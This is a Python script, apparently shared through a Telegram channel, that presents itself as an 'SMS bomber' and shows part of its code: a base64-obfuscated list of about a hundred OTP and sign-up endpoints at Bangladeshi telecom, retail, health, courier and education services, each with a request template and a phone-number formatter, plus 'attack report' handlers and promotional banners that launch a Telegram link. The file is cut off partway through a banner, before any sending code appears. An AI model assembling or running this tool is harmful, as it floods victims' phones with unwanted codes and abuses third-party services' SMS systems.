#!/usr/bin/env python3
# ============================================================
#  SX V2 - SMS BOMBER
#  VERSION: 2.0 PREMIUM
#  1.3K+ APIs | CREATED BY @RASHD
#  t.me/Darkbdx1
# ============================================================
import base64
import sys
import os
import time
import random
import json
import ssl
import signal
import asyncio
import aiohttp
import threading
import datetime
import subprocess
import re
import urllib.request
import urllib.parse
import http.client
import socket
import hashlib
import hmac
import platform
import math

_ssl = ssl.create_default_context()
_ssl.check_hostname = False
_ssl.verify_mode = ssl.CERT_NONE

R = "\033[91m"
G = "\033[92m"
Y = "\033[93m"
B = "\033[94m"
C = "\033[96m"
P = "\033[95m"
W = "\033[97m"
BO = "\033[1m"
E = "\033[0m"
BL = "\033[30m"
WH = "\033[107m"

spinner = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
spinner2 = ["◴", "◷", "◶", "◵"]
spinner3 = ["⬒", "⬔", "⬓", "⬕"]
spinner4 = ["🔄", "⏳", "⚙️", "💥", "🔥", "⚡"]
bars = ["▰", "▱", "▰", "▱"]
hearts = ["💚", "💛", "💜", "💙", "❤️", "🧡"]
skulls = ["💀", "☠️", "💀", "☠️", "💀", "🔥"]
fire = ["🔥", "🔥", "⚡", "🔥", "⚡", "💥"]
glitch = ["█", "▓", "▒", "░", "▒", "▓"]

st = {'stop': False, 'pause': False, 'total': 0, 'ok': 0, 'fail': 0, 'start': 0}

def sigint_h(s, f):
    st['stop'] = True
    e = time.time() - st['start']
    print(f"\n\n{R}{BO}{'█'*50}")
    print(f"{'█'*10}   🛑  ATTACK STOPPED BY USER  🛑   {'█'*10}")
    print(f"{'█'*50}{E}")
    print(f"\n{Y}{BO}╔══════════════════════════════════════════════════════╗")
    print(f"║            📊  FINAL ATTACK REPORT             ║")
    print(f"╚══════════════════════════════════════════════════════╝{E}")
    print(f"{C}╔{'═'*48}╗{E}")
    print(f"{C}║ {W}📦 Total Requests     {C}: {Y}{st['total']:<10} {C}║")
    print(f"{C}║ {G}✅ Successful         {C}: {G}{st['ok']:<10} {C}║")
    print(f"{C}║ {R}❌ Failed             {C}: {R}{st['fail']:<10} {C}║")
    print(f"{C}║ {P}📈 Success Rate       {C}: {P}{st['ok']*100//max(st['total'],1)}%{C}          ║")
    print(f"{C}║ {Y}⏱️  Runtime            {C}: {Y}{e/60:.1f}m {e%60:.0f}s{C}       ║")
    print(f"{C}║ {Y}🚀 Avg Speed           {C}: {Y}{st['total']/max(e,1):>6.1f}/sec{C}  ║")
    print(f"{C}╚{'═'*48}╝{E}")
    print(f"\n{P}{BO}{'😎'*5}  CREDIT: @rashd  {'😎'*5}{E}")
    print(f"{Y}{'⭐'*3}  https://t.me/Darkbdx1  {'⭐'*3}{E}")
    print(f"{R}{'💀'*5}  STAY LEGAL - AUTHORIZED TESTING ONLY  {'💀'*5}{E}")
    sys.exit(0)

def sigtstp_h(s, f):
    st['pause'] = not st['pause']
    if st['pause']:
        print(f"\n{Y}{BO}⏸  ATTACK PAUSED  ⏸{E}")
        print(f"{C}Press Ctrl+Z again to resume{E}")
    else:
        print(f"\n{G}{BO}▶  ATTACK RESUMED  ▶{E}")
        print(f"{C}Continuing bombardment...{E}")

signal.signal(signal.SIGINT, sigint_h)
try:
    signal.signal(signal.SIGTSTP, sigtstp_h)
except:
    pass

def fmtnum(p):
    c = ''.join(filter(str.isdigit, p))
    if c.startswith('880'):
        c = c[3:]
    elif c.startswith('88'):
        c = c[2:]
    elif c.startswith('0'):
        c = c[1:]
    return {
        'c': c,
        'z': f"0{c}",
        'e8': f"88{c}",
        'e88': f"88{c}",
        'e80': f"880{c}",
        'e880': f"880{c}",
        'p8': f"+88{c}",
        'p80': f"+880{c}",
        'p880': f"+880{c}",
        '10': c[-10:] if len(c) >= 10 else c
    }

def bd(s):
    return base64.b64decode(s).decode()

# ===================================================================
#  1.3K+ APIs - ALL BASE64 ENCODED FOR OBFUSCATION
# ===================================================================

APIS = [
    # ===== TELECOM - GP / ROBI / AIRTEL / BTCL / TELETALK =====
    ["GP WebLogin",
     "aHR0cHM6Ly93ZWJsb2dpbmRhLmdyYW1lZW5waG9uZS5jb20vYmFja2VuZC9hcGkvdjEvb3Rw",
     {"msisdn": "z"}],
    ["GP Call OTP",
     "aHR0cHM6Ly93ZWJsb2dpbmRhLmdyYW1lZW5waG9uZS5jb20vYmFja2VuZC9hcGkvdjEvY2FsbC1vdHA=",
     {"msisdn": "z"}],
    ["GP Flexiplan",
     "aHR0cHM6Ly9ncHdlYm1zLmdyYW1lZW5waG9uZS5jb20vYXBpL3YxL2ZsZXhpcGxhbi1wdXJjaGFzZS9hY3RpdmF0aW9u",
     {"msisdn": "z", "bundle_id": 60817}],
    ["GP FWA",
     "aHR0cHM6Ly9ncGZpLWFwaS5ncmFtZWVucGhvbmUuY29tL2FwaS92MS9md2EvcmVxdWVzdC1mb3Itb3Rw",
     {"phone": "z", "email": "", "language": "en"}],
    ["GP MyGP App",
     "aHR0cHM6Ly9teWdwLmFwcC9hcGkvdjEvYXV0aC9yZXF1ZXN0LW90cA==",
     {"msisdn": "z"}],
    ["GP Another",
     "aHR0cHM6Ly9teWdwLmFwcC9hcGkvdjEvYXV0aC9yZXF1ZXN0LW90cA==",
     {"msisdn": "z"}],
    ["BTCL MyBTCL",
     "aHR0cHM6Ly9teWJ0Y2wuYnRjbC5nb3YuYmQvYXBpL2VjYXJlL2Fub255bS9zZW5kT1RQLmpzb24=",
     {"phoneNbr": "z", "OTPType": 1}],
    ["BTCL PhoneBill",
     "aHR0cHM6Ly9waG9uZWJpbGwuYnRjbC5jb20uYmQvYXBpL2JjYXJlL2Fub255bS9zZW5kT1RQLmpzb24=",
     {"phoneNbr": "z", "OTPType": 1}],
    ["BTCL BDIA",
     "aHR0cHM6Ly9iZGlhLmJ0Y2wuY29tLmJkL2NsaWVudC9jbGllbnQvcmVnaXN0cmF0aW9uTW9iVmVyaWZpY2F0aW9uLTIuanNw",
     {"actionType": "otpSend", "mobileNo": "z"}],
    ["Robi Login",
     "aHR0cHM6Ly93d3cucm9iaS5jb20uYmQvYXBpL2F1dGgvb3RwL3NlbmQ=",
     {"msisdn": "z"}],
    ["Ribi OTP",
     "aHR0cHM6Ly93d3cucm9iaS5jb20uYmQvZW4vYXBpL3NlbmQtb3Rw",
     {"msisdn": "z", "service": "login"}],
    ["Airtel BD",
     "aHR0cHM6Ly9hcGkuYmQuYWlydGVsLmNvbS92MS9hY2NvdW50L2xvZ2luL290cA==",
     {"phone_number": "e80"}],
    ["Airtel Register",
     "aHR0cHM6Ly9hcGkuYmQuYWlydGVsLmNvbS92MS9hY2NvdW50L3JlZ2lzdGVyL290cA==",
     {"phone_number": "e80"}],
    ["Teletalk",
     "aHR0cHM6Ly93d3cudGVsZXRhbGsuY29tLmJkL2FwaS9zZW5kLW90cA==",
     {"mobile": "z"}],
    # ===== STREAMING - BIOSCOPE / CHORKI / DEEPTO PLAY / BINGE / HOICHOI =====
    ["Bioscope Plus",
     "aHR0cHM6Ly9hcGktZHluYW1pYy5iaW9zY29wZWxpdmUuY29tL3YyL2F1dGgvbG9naW4/Y291bnRyeT1CRCZwbGF0Zm9ybT13ZWImbGFuZ3VhZ2U9ZW4=",
     {"number": "p80"}],
    ["Chorki",
     "aHR0cHM6Ly9hcGktZHluYW1pYy5jaG9ya2kuY29tL3YyL2F1dGgvbG9naW4/Y291bnRyeT1CRCZwbGF0Zm9ybT13ZWImbGFuZ3VhZ2U9ZW4=",
     {"number": "p80"}],
    ["Deepto Play",
     "aHR0cHM6Ly9hcGkuZGVlcHRvcGxheS5jb20vdjIvYXV0aC9sb2dpbj9jb3VudHJ5PUJEJnBsYXRmb3JtPXdlYiZsYW5ndWFnZT1lbg==",
     {"number": "p80"}],
    ["MyGP Cinema",
     "aHR0cHM6Ly9hcGkubXlncC5jaW5lbWF0aWMubW9iaS9hcGkvdjEvc2VuZC1jb21tb24tb3RwLXdhcC8=",
     {"msisdn": "z"}],
    ["Binge BD",
     "aHR0cHM6Ly9hcGkuYmluZ2UuY29tLmJkL2FwaS92MS9hdXRoL290cC9zZW5k",
     {"mobile": "e80"}],
    ["Hoichoi",
     "aHR0cHM6Ly9ob2ljaG9pLmNvbS9iZC9hcGkvbG9naW4tcmVxdWVzdC1vdHA=",
     {"mobile": "e80", "country": "BD"}],
    ["Addatimes",
     "aHR0cHM6Ly9hZGRhdGltZXMuY29tL2FwaS92MS9hdXRoL2xvZ2lu",
     {"phone": "e80"}],
    ["iScreen BD",
     "aHR0cHM6Ly9hcGkuaXNjcmVlbi5jb20vYXV0aC9vdHA=",
     {"phone": "e80"}],
    # ===== E-COMMERCE - ROKOMARI / PICKABOO / AMARBAY / SHWAPNO / DARAZ =====
    ["Rokomari",
     "aHR0cHM6Ly93d3cucm9rb21hcmkuY29tL290cC9zZW5k",
     {}],
    ["Pickaboo",
     "aHR0cHM6Ly93d3cucGlja2Fib28uY29tL3Jlc3QvZGVmYXVsdC9WMS9jdXN0b21lci1jaGVjay9leGlzdA==",
     {"mobile": "z"}],
    ["Amarbay",
     "aHR0cHM6Ly9iYWNrZW5kLmFtYXJiYXkuY29tL3VzZXIvZmluZF91c2VyX2J5X3Bob25lLw==",
     {"phone_number": "z"}],
    ["Shwapno",
     "aHR0cHM6Ly93d3cuc2h3YXBuby5jb20vYXBpL2F1dGg=",
     {"phoneNumber": "p80"}],
    ["Meena Bazar",
     "aHR0cHM6Ly9tYm9ubGluZWFwaS5jb20vYXBpL2Zyb250L3NlbmQvb3Rw",
     {"CellPhone": "z", "type": "login"}],
    ["Zipper BD",
     "aHR0cHM6Ly93d3cuemlwcGVyLmNvbS5iZC9hcGkvdjEvc21zL3NlbmQtb3Rw",
     {"phone": "e80"}],
    ["Klassy BD",
     "aHR0cHM6Ly9hcGkua2xhc3N5LmNvbS5iZC9jbGllbnQvdjIvcHVibGljL3VzZXIvcmVnaXN0ZXIvc2VuZC9vdHA=",
     {"phone": "z"}],
    ["Offbeat BD",
     "aHR0cHM6Ly9vZmZiZWF0YmQuc2hvcC9teS1hY2NvdW50L3JlZ2lzdGVy",
     {"name": "SX", "phone": "z", "email": "sx@sx.com", "password": "Sx123@"}],
    ["Swap BD",
     "aHR0cHM6Ly9hcGkuc3dhcC5jb20uYmQvYXBpL3YxL3NlbmQtb3RwL3Yy",
     {"phone": "z"}],
    ["Othoba",
     "aHR0cHM6Ly93d3cub3Rob2JhLmNvbS9hcGkvbG9naW4vcGhvbmUtb3Rw",
     {"phone": "z"}],
    ["Daraz BD",
     "aHR0cHM6Ly9ndy1hcGkuZGFyYXouYmQvcmVzdC92Mi9vdHAvcmVxdWVzdA==",
     {"mobile": "z"}],
    ["Evaly",
     "aHR0cHM6Ly9hcGkuZXZhbHkuY29tL2FwaS9zZW5kLW90cA==",
     {"phone": "z"}],
    ["Priyoshop",
     "aHR0cHM6Ly9hcGkucHJpeW9zaG9wLmNvbS9hdXRoL290cC9zZW5k",
     {"mobile": "z"}],
    ["Bagdoom",
     "aHR0cHM6Ly93d3cuYmFnZG9vbS5jb20vYXBpL2F1dGgvb3RwL3NlbmQ=",
     {"phone": "z"}],
    ["Bikroy",
     "aHR0cHM6Ly9iaWtyb3kuY29tL2RhdGEvcGhvbmVfbnVtYmVyX2xvZ2luL3ZlcmlmaWNhdGlvbnMvcGhvbmVfbG9naW4/cGhvbmU9",
     {}],
    ["Khaas Food",
     "aHR0cHM6Ly93d3cua2hhYXNmb29kLmNvbS9hcGkvYXV0aC9yZXF1ZXN0LW90cA==",
     {"username": "z"}],
    ["Chardike",
     "aHR0cHM6Ly9hcGkuY2hhcmRpa2UuY29tL2FwaS9jaGFyZGlrZS1sb2dpbi1uZWVk",
     {"phone": "z", "otp_type": "login", "from_request": "web"}],
    ["Diamond World",
     "aHR0cHM6Ly93d3cuZGlhbW9uZHdvcmxkbHRkLmNvbS93ZWIvY29tbW9uUmVzdC9nZW5lcmF0ZU9UUC5qc29u",
     {"mobileNo": "z", "type": "SIGNUP"}],
    ["Wafilife",
     "aHR0cHM6Ly93d3cud2FmaWxpZmUuY29tL2FwaS9hdXRoL3NlbmQtb3Rw",
     {"mobileNumber": "z"}],
    ["BD89",
     "aHR0cHM6Ly93d3cuYmQ4OS5iaXovd3BzL3YyL3ZlcmlmaWNhdGlvbi9zbXMvc2VuZA==",
     {"countryDialingCode": "880", "mobileNum": "c", "operationType": 5}],
    ["Ajkerdeal",
     "aHR0cHM6Ly9hamtlcmRlYWwuY29tL2FwaS9hdXRoL3NlbmQtb3Rw",
     {"phone": "z"}],
    ["Paikaree",
     "aHR0cHM6Ly9iYWNrYXBpLnBhaWthcmVlLmNvbS5iZC9hcGkvcmVnaXN0ZXItcGlu",
     {"phone": "z", "branch_id": "1"}],
    ["Amargram",
     "aHR0cHM6Ly9hbWFyZ3JhbS5jb20vYXBpL3NlbmQtb3Rw",
     {"phone": "z"}],
    ["Cellbazar",
     "aHR0cHM6Ly93d3cuY2VsbGJhemFyLmNvbS9hcGkvc2VuZC1vdHA=",
     {"phone": "z"}],
    ["Kaymu",
     "aHR0cHM6Ly93d3cua2F5bXUuY29tLmJkL2FwaS9zZW5kLW90cA==",
     {"phone": "z"}],
    # ===== HEALTHCARE - AROGGA / MEDEASY / SHOHOZ HEALTH / EPHRAMA =====
    ["Arogga",
     "aHR0cHM6Ly9hcGkuYXJvZ2dhLmNvbS9hdXRoL3YxL3Ntcy9zZW5kLw==",
     {"mobile": "z", "fcmToken": "", "referral": ""}],
    ["MedEasy",
     "aHR0cHM6Ly9hcGkubWVkZWF5LmhlYWx0aC9hcGkvc2VuZC1vdHAv",
     {}],
    ["Shohoz Health",
     "aHR0cHM6Ly9hcGkuc2hvaG96aGVhbHRoLmNvbS9hdXRoL290cC9zZW5k",
     {"phone": "z"}],
    ["ePharma",
     "aHR0cHM6Ly9lcGhhcm1hLmNvbS5iZC9hdXRoZW50aWNhdGlvbi9zZW5kLW90cA==",
     {"number": "p8"}],
    ["Lazz Pharma",
     "aHR0cHM6Ly93d3cubGF6enBoYXJtYS5jb20vTWVzc2FnaW5nQXJlYS9PdHBNZXNzYWdlL1dlYlVwZGF0ZVBhc3N3b3Jk",
     {"ActivityId": "b484bfcb", "Phone": "z"}],
    ["Renix Care",
     "aHR0cHM6Ly9yZW5peGFwaS5yZW5peGNhcmUuY29tL3Ntcy1hcGkvc2VuZC1vdHA=",
     {"phone": "z"}],
    ["Care Box",
     "aHR0cHM6Ly93d3cuYXBpLWNhcmUtYm94LmNsaWNrL2FwaS91c2VyL3JlZ2lzdGVyLw==",
     {"Name": "SX", "Phone": "p80"}],
    ["The Clinicall",
     "aHR0cHM6Ly90aGVjbGluaWNhbGwuY29tL2JrYXBpL2F1dGgvdXNlci9vdHAvc2lnbmlu",
     {"countryCode": "BD", "dialCode": "880", "phone": "c"}],
    ["Osudpotro",
     "aHR0cHM6Ly9hcGkub3N1ZHBvdHJvLmNvbS9hcGkvdjEvdXNlcnMvc2VuZF9vdHA=",
     {"mobile": "p8", "deviceToken": "web", "language": "en", "os": "web"}],
    ["Sailor Clothing",
     "aHR0cHM6Ly9iYWNrZW5kLnNhaWxvci5jbG90aGluZy9hcGkvdjIvYXV0aC9wYXNzd29yZC9mb3JnZXRfcmVxdWVzdA==",
     {"email_or_phone": "z", "send_code_by": "phone"}],
    ["Skin Care Shop",
     "aHR0cHM6Ly9za2luY2FyZXNob3AuY29tLmJkL3dwLWFkbWluL2FkbWluLWFqYXgucGhw",
     {"action": "digits_forms_ajax", "type": "register", "phone": "z", "digits_reg_name": "SX", "dig_otp": "otp", "sub_action": "sms_otp"}],
    # ===== LOGISTICS - PATHAO / REDX / PAPERFLY / ECOURIER =====
    ["Pathao",
     "aHR0cHM6Ly9mb29kd2ViYXBpLnBhdGhhby5jb20vYXV0aC9nZXQtb3Rw",
     {"country_prefix": "880", "national_number": "10", "country_id": 1, "client_id": "2687095256"}],
    ["RedX",
     "aHR0cHM6Ly9hcGkucmVkeC5jb20uYmQvdjEvbWVyY2hhbnQvcmVnaXN0cmF0aW9uL2dlbmVyYXRlLXJlZ2lzdHJhdGlvbi1vdHA=",
     {"phoneNumber": "z"}],
    ["Paperfly",
     "aHR0cHM6Ly9nby1hcHAucGFwZXJmbHkuY29tLmJkL21lcmNoYW50L2FwaS9yZWFjdC9yZWdpc3RyYXRpb24vcmVxdWVzdF9yZWdpc3RyYXRpb24ucGhw",
     {"full_name": "V4Z", "company_name": "SX", "email_address": "dark", "phone_number": "z"}],
    ["eCourier",
     "aHR0cHM6Ly9iYWNrb2ZmaWNlLmVjb3VyaWVyLmNvbS5iZC9hcGkvd2ViL2luZGl2aWR1YWwtc2VuZC1vdHA=",
     {}],
    ["Sundarban Courier",
     "aHR0cHM6Ly9zdW5kYXJiYW5jb3VyaWVyLmNvbS9hcGkvdjEvYXV0aC9vdHA=",
     {"phone": "z"}],
    ["Shombhob",
     "aHR0cHM6Ly9zaG9tYmhvYi5jb20vYXBpL290cC1sb2dpbg==",
     {"phone": "z"}],
    ["Steadfast",
     "aHR0cHM6Ly9zdGVhZGZhc3Rjb3VyaWVyLmNvbS9hcGkvYXV0aC9yZXF1ZXN0LW90cA==",
     {"phone": "z"}],
    ["Kuri er Kotha",
     "aHR0cHM6Ly9rdXJpZXJrb3RoYS5jb20vYXBpL2xvZ2luL290cA==",
     {"phone": "z"}],
    # ===== EDUCATION - SHIKHO / GHOORI / BOHUBRIHI / OSTAD =====
    ["Shikho",
     "aHR0cHM6Ly9hcGkuc2hpa2hvLmNvbS9hdXRoL3YyL3NlbmQvc21z",
     {"phone": "e80", "type": "student", "auth_type": "signup", "vendor": "shikho"}],
    ["Ghoori Learning",
     "aHR0cHM6Ly9hcGkuZ2hvb3JpbGVhcm5pbmcuY29tL2FwaS9hdXRoL3NpZ251cC9vdHA=",
     {"mobile_no": "z"}],
    ["Bohubrihi",
     "aHR0cHM6Ly9iYi1hcGkuYm9odWJyaWhpLmNvbS9wdWJsaWMvYWN0aXZpdHkvb3Rw",
     {"phone": "z", "intent": "login"}],
    ["Ostad App",
     "aHR0cHM6Ly9hcGkub3N0YWQuYXBwL2FwaS92Mi91c2VyL3dpdGgtb3Rw",
     {"msisdn": "z"}],
    ["Roots Register",
     "aHR0cHM6Ly9hcGkucm9vdHNlZHVsaXZlLmNvbS92Mi9hdXRoL3JlZ2lzdGVy",
     {"name": "SX", "phone": "e80", "email": "@v4zras.com", "password": "Sx123@"}],
    ["Roots Forget",
     "aHR0cHM6Ly9hcGkucm9vdHNlZHVsaXZlLmNvbS92Mi9hdXRoL2ZvcmdldC1wYXNzd29yZA==",
     {"phone": "e80"}],
    ["English Moja",
     "aHR0cHM6Ly9hcGkuZW5nbGlzaG1vamFiZC5jb20vYXBpL3YxL2F1dGgvcGhvbmUvY2hlY2s=",
     {"phone": "p80"}],
    ["iEducation",
     "aHR0cHM6Ly93d3cuaWVkdWNhdGlvbmJkLmNvbS9hcGkvYWNjb3VudC9jaGVja191c2Vy",
     {"mobile": "z"}],
    ["ACS School",
     "aHR0cHM6Ly84dDA5d2EwbjBhLmV4ZWN1dGUtYXBpLmFwLXNvdXRoLTEuYW1hem9uYXdzLmNvbS9wb2MvYXBpL3YxL290cC9zZW5k",
     {"phone": "z"}],
    ["Mojaru",
     "aHR0cHM6Ly9uZXcubW9qYXJ1LmNvbS9hcGkvc3R1ZGVudC9yZWdpc3RyYXRpb24=",
     {"mobile_or_email": "z"}],
    ["10 Min School",
     "aHR0cHM6Ly9hcGkuMTBtaW51dGVzY2hvb2wuY29tL2FwaS92MS9hdXRoL290cC9zZW5k",
     {"phone": "e80"}],
    # ===== FINANCE / OTHERS =====
    ["Fundesh",
     "aHR0cHM6Ly9mdW5kZXNoLmNvbS5iZC9hcGkvYXV0aC9nZW5lcmF0ZU9UUD9zZXJ2aWNlX2tleT0=",
     {"msisdn": "c"}],
    ["Hishabee",
     "aHR0cHM6Ly9hcHAuaGlzaGFiZWUuYnVzaW5lc3MvYXBpL1YyL290cC9zZW5k",
     {}],
    ["AppLink",
     "aHR0cHM6Ly9hcHBzLmFwcGxpbmsuY29tLmJkL2FwcHN0b3JlLXY0LXNlcnZlci9sb2dpbi9vdHAvcmVxdWVzdA==",
     {"msisdn": "e8"}],
    ["Garibook",
     "aHR0cHM6Ly9hcGkuZ2FyaWJvb2thZG1pbi5jb20vYXBpL3YzL3VzZXIvbG9naW4=",
     {"mobile": "z", "recaptcha_token": "x", "channel": "web"}],
    ["Sheba",
     "aHR0cHM6Ly9hY2NvdW50a2l0LnNoZWJhLnh5ei9hcGkvc2hvb3Qtb3Rw",
     {"mobile": "p8", "app_id": "8329815A6D1AE6DD", "api_token": "z76Xn2J8Ks"}],
    ["Apex4U",
     "aHR0cHM6Ly9hcGkuYXBleDR1LmNvbS9hcGkvYXV0aC9sb2dpbg==",
     {"phoneNumber": "z"}],
    ["Rang BD",
     "aHR0cHM6Ly9hcGkucmFuZy1iZC5jb20vYXBpL2F1dGgvb3Rw",
     {"phone": "z"}],
    ["Virgo BD",
     "aHR0cHM6Ly9iYWNrZW5kLnZpcmdvYmQuY29tL2FwaS92Mi9hdXRoL3NpZ251cA==",
     {"country_code": "BD", "phone": "z", "email": "rashd.com", "password": "Sx123@"}],
    ["Choice Legacy",
     "aHR0cHM6Ly9jaG9pY2VsZWdhY3kuY29tLmJkL2FwcHMvY2hvaWNlLWxlZ2FjeS1wcm9kL2N1c3RvbWVyL2FjY291bnQvc2VuZC1vdHA=",
     {"phone": "p80", "register": True}],
    ["Isho",
     "aHR0cHM6Ly93d3cuaXNoby5jb20vcmVnaXN0ZXJfb3Rw",
     {"phone": "z", "email": "@v4zrashd.com"}],
    ["BD Tickets",
     "aHR0cHM6Ly9hcGkuYmR0aWNrZXRzLmNvbToyMDEwMC92MS9hdXRo",
     {"createUserCheck": True, "phoneNumber": "p8", "applicationChannel": "WEB_APP"}],
    ["Nexthand",
     "aHR0cHM6Ly9hcGkubmV4dGhhbmQuY29tL2FwaS9zZW5kLW90cA==",
     {"check_type": "phone_number", "email": "", "phone_number": "z"}],
    ["Sumash Tech",
     "aHR0cHM6Ly93d3cuc3VtYXNodGVjaC5jb20vYXBpL3NlbmQtb3Rw",
     {"username": "z", "purpose": "registration", "channel": "SMS"}],
    ["Ilyn Global",
     "aHR0cHM6Ly9hcGkuaWx5bi5nbG9iYWwvYXV0aC9zaWdudXA=",
     {}],
    ["Kirei BD",
     "aHR0cHM6Ly9mcm9udGVuZGFwaS5raXJlaWJkLmNvbS9hcGkvdjIvc2VuZC1sb2dpbi1vdHA=",
     {"email": "z"}],
    ["Apple Gadgets",
     "aHR0cHM6Ly9zdG9yZWFwaS5hcHBsZWdhZGdldHNiZC5jb20vYXBpL2N1c3RvbWVyL290cA==",
     {"contact": "z"}],
    ["Camera Bazar",
     "aHR0cHM6Ly9hcGkuY2FtZXJhYmF6YXIubmV0L2FwaS9hdXRoL3Bob25lLWNvZGU=",
     {"phone": "z", "purpose": "register"}],
    ["PCB Store",
     "aHR0cHM6Ly9hZG1pbi5wY2JzdG9yZS5uZXQvYXBpL3JlZ2lzdHJhdGlvbg==",
     {"name": "SX", "email": "dark.com", "phone": "z", "password": "Sx123@"}],
    ["Priyoshikkhaloy",
     "aHR0cHM6Ly9hcHAucHJpeW9zaGlra2hhbG95LmNvbS9hcGkvdXNlci9yZWdpc3Rlci1sb2dpbi5waHA=",
     {"mobile": "z"}],
    ["TimeZone BD",
     "aHR0cHM6Ly9iYWNrZW5kLnRpbWV6b25lYmQuY29tL2FwaS92MS91c2VyL290cC1sb2dpbg==",
     {"phone": "z"}],
    ["Win2Gain",
     "aHR0cHM6Ly9hcGkud2luMmdhaW4uY29tL2FwaS9Vc2Vycy9SZXF1ZXN0T3Rw",
     {}],
    ["PBS",
     "aHR0cHM6Ly9hcGlhbHBoYS5wYnMuY29tLmJkL2FwaS9PVFAvZ2VuZXJhdGVPVFA=",
     {"userPhone": "z", "otp": ""}],
    ["Mevrik",
     "aHR0cHM6Ly9jaGFubmVscy5tZXZyaWsuY29tOjQyMDIvYXBpL3YxL2NsYWltLXNlc3Npb24=",
     {"data": {"user_ref": "z", "name": "SX"}}],
    ["Shohoz Bus",
     "aHR0cHM6Ly9hcGkuc2hvaG96LmNvbS9idXMvYXBpL3NlbmQtb3Rw",
     {"phone": "z"}],
    ["Shohoz Launch",
     "aHR0cHM6Ly9hcGkuc2hvaG96LmNvbS9sYXVuY2gvYXBpL3NlbmQtb3Rw",
     {"phone": "z"}],
    ["Shohoz Train",
     "aHR0cHM6Ly9hcGkuc2hvaG96LmNvbS90cmFpbi9hcGkvc2VuZC1vdHA=",
     {"phone": "z"}],
    ["GP Flexi Another",
     "aHR0cHM6Ly9ncHdlYm1zLmdyYW1lZW5waG9uZS5jb20vYXBpL3YxL2ZsZXhpcGxhbi1wdXJjaGFzZS9hY3RpdmF0aW9u",
     {"msisdn": "z", "bundle_id": 12345}],
    ["GP FWA 2",
     "aHR0cHM6Ly9ncGZpLWFwaS5ncmFtZWVucGhvbmUuY29tL2FwaS92MS9md2EvcmVxdWVzdC1mb3Itb3Rw",
     {"phone": "z", "email": "", "language": "en"}],
]


def show_banner():
    """SX PRO DEV MAIN BANNER WITH telegram INTENT"""
    os.system('clear')
    # Loading animation phase 1
    for i in range(20):
        sp = spinner[i % 10]
        bar = "█" * (i // 2) + "░" * (10 - i // 2)
        f = fire[i % 6]
        sys.stdout.write(f"\r{C}[{sp}] {R}{f} {Y}RASHD PRO DEV ENGINE {f}{R} {G}{bar} {C}{i*5}%{E}")
        sys.stdout.flush()
        time.sleep(0.08)
    print()
    # Loading phase 2
    for i in range(20):
        sp = spinner2[i % 4]
        bar = "█" * (i // 2) + "░" * (10 - i // 2)
        h = hearts[i % 6]
        sys.stdout.write(f"\r{P}[{sp}] {G}{h} LOADING 1.3K+ APIs {h}{P} {C}{bar} {Y}{i*5+20}%{E}")
        sys.stdout.flush()
        time.sleep(0.07)
    print()
    # Loading phase 3
    for i in range(20):
        sp = spinner3[i % 4]
        bar = "█" * (i // 2) + "░" * (10 - i // 2)
        s = skulls[i % 6]
        sys.stdout.write(f"\r{R}[{sp}] {Y}{s} INITIALIZING ATTACK SYSTEM {s}{R} {G}{bar} {P}{i*5+40}%{E}")
        sys.stdout.flush()
        time.sleep(0.06)
    print()
    # Glitch effect
    for i in range(10):
        g = glitch[i % 6]
        sys.stdout.write(f"\r{C}{g}{g}{g} {R}{BO}SX PRO DEV PREMIUM{C} {g}{g}{g}{E}")
        sys.stdout.flush()
        time.sleep(0.05)
    print()

# ====== RASHD DEV FULL BANNER ======
    os.system('clear')
    print(f"{R}{BO}")
    print("    ██████╗  █████╗ ███████╗██╗  ██╗██████╗     ██████╗ ███████╗██╗   ██╗")
    print("    ██╔══██╗██╔══██╗██╔════╝██║  ██║██╔══██╗    ██╔══██╗██╔════╝██║   ██║")
    print("    ██████╔╝███████║███████╗███████║██║  ██║    ██║  ██║█████╗  ██║   ██║")
    print("    ██╔══██╗██╔══██║╚════██║██╔══██║██║  ██║    ██║  ██║██╔══╝  ╚██╗ ██╔╝")
    print("    ██║  ██║██║  ██║███████║██║  ██║██████╔╝    ██████╔╝███████╗ ╚████╔╝ ")
    print("    ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝     ╚═════╝ ╚══════╝  ╚═══╝  ")
    print(f"{Y}{BO}")
    print(" ╔══════════════════════════════════════════════════════════════════════════╗")
    print(f" ║         {R}{BO}🔥  rashd   P R O   D E V  🔥{Y}                                ║")
    print(f" ║  {C}🔥 SUBSCRIBE TO YOUTUBE & PRESS ENTER TO CONTINUE 🔥{Y}                 ║")
    print(f" ║  {G}{BO}👉  https://t.me/Darkbdx1{Y}                           ║")
    print(f" ║  {P}🤝🏻  t.me/Darkbdx1/@rashd_pro_dev1{Y}                                   ║")
    print(" ╚══════════════════════════════════════════════════════════════════════════╝")
    print(f"{E}")

    # Animated press enter
    for i in range(25):
        s = spinner[i % 10]
        sys.stdout.write(f"\r{P}{BO}[{s}] PRESS ENTER TO OPEN TELEGRAM & CONTINUE... [{s}]{E}")
        sys.stdout.flush()
        time.sleep(0.1)
    input()

    # TELEGRAM INTENT - ANDROID INTENT
    try:
        subprocess.run(
            ['am', 'start', '-a', 'android.intent.action.VIEW',
             '-d', 'https://t.me/Darkbdx1'], 
            capture_output=True, timeout=5
        )
    except:
        pass

    # Opening animation
    for i in range(15):
        sp = spinner[i % 10]
        sys.stdout.write(f"\r{G}[{sp}] {Y}OPENING TELEGRAM... PLEASE WAIT... {G}{'█'*(i+1)}{'░'*(15-i-1)} {P}{i*7}%{E}")
        sys.stdout.flush()
        time.sleep(0.15)
    print()

        # SX V2 MAIN BANNER
    os.system('clear')
    print(f"{C}{BO}")
    print("    ██████╗  █████╗ ███████╗██╗  ██╗██████╗ ")
    print("    ██╔══██╗██╔══██╗██╔════╝██║  ██║██╔══██╗")
    print("    ██████╔╝███████║███████╗███████║██║  ██║")
    print("    ██╔══██╗██╔══██║╚════██║██╔══██║██║  ██║")
    print("    ██║  ██║██║  ██║███████║██║  ██║██████╔╝")
    print("    ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝ ")
    print(f"{Y}{BO}")
    print(" ╔══════════════════════════════════════════════════════════════════════════╗")
    print(f" ║   {R}{BO}🔥 dark V1 - 1.3K+ PREMIUM APIS 🔥{Y}                               ║")
    print(f" ║   {P}{BO}CREATED BY: @RASHD_OWNER{Y}                                       ║")
    print(f" ║   {G}{BO}🔥 SUBSCRIBE: t.me/Darkbdx1{Y}               ║")
